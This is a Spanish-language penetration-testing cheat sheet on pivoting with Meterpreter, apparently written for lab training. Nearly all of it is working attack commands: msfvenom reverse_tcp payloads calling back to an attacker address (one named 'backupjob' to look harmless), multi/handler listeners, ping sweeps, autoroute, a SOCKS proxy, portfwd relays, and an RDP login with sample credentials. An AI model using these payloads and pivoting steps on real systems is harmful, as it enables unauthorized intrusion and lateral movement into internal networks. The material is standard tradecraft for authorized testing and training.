# Meterpreter port forwarding

Meterpreter ofrece capacidades de pivoting integradas sin depender de SSH. Una vez establecida una sesión en un pivot host, se puede crear un proxy SOCKS y añadir rutas para alcanzar redes internas, o hacer port forwarding directo a servicios específicos.

### Flujo general

```
Atacante → Meterpreter session → PivotHost → red_interna
```

### Obtener sesión Meterpreter en el pivot host

```bash
# Generar payload para Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.18 LPORT=8080 \
  -f elf -o backupjob

# Listener en Metasploit
msf6> use exploit/multi/handler
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8080
msf6> run

# Ejecutar en el pivot host
chmod +x backupjob && ./backupjob
```

### Reconocimiento desde Meterpreter

Una vez en la sesión, antes de configurar el pivoting conviene mapear la red interna:

```bash
# Ping sweep via módulo Meterpreter
meterpreter> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Ping sweep manual desde el pivot (Linux)
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Ping sweep (Windows CMD)
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Ping sweep (PowerShell)
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### añadir rutas a redes internas

AutoRoute añade rutas a la tabla de enrutamiento de Metasploit para que el tráfico hacia la red interna se envíe a través de la sesión Meterpreter.

```bash
# Desde la sesión Meterpreter
meterpreter> run autoroute -s 172.16.5.0/23

# Listar rutas activas
meterpreter> run autoroute -p

# Alternativa — desde msfconsole
msf6> use post/multi/manage/autoroute
msf6> set SESSION 1
msf6> set SUBNET 172.16.5.0
msf6> run
```

Salida típica:

```
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.254.0      Session 1
```

### Proxy SOCKS via Metasploit

Con las rutas configuradas, levantar un proxy SOCKS para usar herramientas externas como Nmap o xfreerdp a través de la sesión:

```bash
msf6> use auxiliary/server/socks_proxy
msf6> set SRVHOST 0.0.0.0
msf6> set SRVPORT 9050
msf6> set VERSION 4a    # o 5
msf6> run

# Verificar que está activo
msf6> jobs
```

Configurar proxychains:

```bash
# /etc/proxychains.conf — última línea
socks4  127.0.0.1 9050
```

Usar herramientas externas a través del proxy:

```bash
# Escanear host interno
proxychains nmap -v -Pn -sT -p3389,445,80 172.16.5.19

# Verificar RDP en host interno via Metasploit
msf6> use auxiliary/scanner/rdp/rdp_scanner
msf6> set RHOSTS 172.16.5.19
msf6> run
```

> Solo TCP connect scan (`-sT`) con `-Pn`. Los firewalls Windows bloquean ICMP por defecto, lo que hace fallar los host-alive checks.

### Port Forwarding con portfwd

`portfwd` dentro de Meterpreter crea relés TCP directos sin necesidad de proxychains:

```bash
# Ver opciones
meterpreter> help portfwd

# Forward: redirigir puerto local al host interno
# Atacante:3300 → pivot → 172.16.5.19:3389
meterpreter> portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Listar reenvíos activos
meterpreter> portfwd list

# Eliminar un reenvío
meterpreter> portfwd delete -l 3300

# Conectar al servicio como si fuera local
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Reverse port forward con portfwd

Para recibir conexiones desde el objetivo a través del pivot:

```bash
# pivot escucha en 1234 y reenvía al atacante:8081
meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# Listener en el atacante
msf6> set LPORT 8081
msf6> run

# Payload en el objetivo — apunta al pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.129 LPORT=1234 \
  -f exe -o shell.exe
```

### Flujo completo — reverse shell desde red segmentada via Meterpreter

```
Objetivo Windows (172.16.5.19) → callback → PivotHost:1234 
    → portfwd → Atacante:8081 → Meterpreter session 2
```

```bash
# 1. Tener sesión Meterpreter en el pivot
# 2. Configurar autoroute
meterpreter> run autoroute -s 172.16.5.0/23

# 3. Configurar reverse port forward
meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# 4. Background de la sesión
meterpreter> bg

# 5. Listener para el Windows
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8081
msf6> run

# 6. Generar y ejecutar payload en Windows
# El callback llega a pivot:1234 → atacante:8081
```

### Verificación con netstat

```bash
# Desde el atacante — ver conexiones establecidas
netstat -antp | grep ESTABLISHED

# Confirmar que el portfwd está activo
netstat -antp | grep <puerto_local>
```

### SSH vs Meterpreter para pivoting

| Técnica                 | Ventaja                              | Inconveniente                      |
| ----------------------- | ------------------------------------ | ---------------------------------- |
| SSH `-D` + proxychains  | No requiere payload en pivot         | Requiere SSH activo y credenciales |
| SSH `-L` local forward  | Simple para un servicio específico   | Un túnel por servicio              |
| SSH `-R` remote forward | Útil sin conectividad directa        | Requiere SSH bidireccional         |
| Meterpreter + autoroute | Integrado en Metasploit, sin SSH     | Requiere sesión Meterpreter activa |
| Meterpreter portfwd     | Port forward directo sin proxychains | Solo TCP, un reenvío por regla     |
